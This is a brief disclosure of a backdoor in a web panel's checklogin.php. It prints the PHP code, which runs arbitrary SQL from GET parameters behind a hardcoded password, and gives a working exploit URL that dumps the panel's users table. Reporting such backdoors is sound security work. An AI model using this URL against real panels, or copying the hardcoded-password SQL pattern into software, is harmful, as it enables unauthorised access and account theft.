
Type: Backdoor

Author: [MisterCh0c](https://twitter.com/MisterCh0c)

There is a backdoor (A.K.A debug function) in the checklogin.php page:

```
/* debug funcs */
if($_GET["pass"] === '20Pru9BOrbwXOlT0lBafb98'){
    switch($_GET["func"]){
        case 'execute':
        {
            $db = GetMysqlConnection();
            $db->query($_GET['code']);
            WriteLog($_GET["func"], 'Success', $_GET['code']);
            break;
        }
        case 'select':
        {
            $db = GetMysqlConnection();
            $resultbd = $db->query($_GET['code']);
            WriteLog($_GET["func"], 'Success', $_GET['code']);
            echo '<br>';
            while ($row = $resultbd->fetch_assoc()) {
                print_r($row);
                echo '<br>';
            }
            break;
        }
    }
}

To exploit it and extract panel accounts:
http://panel.address/checklogin.php?pass=20Pru9BOrbwXOlT0lBafb98&func=select&code=select*from%20users;
```
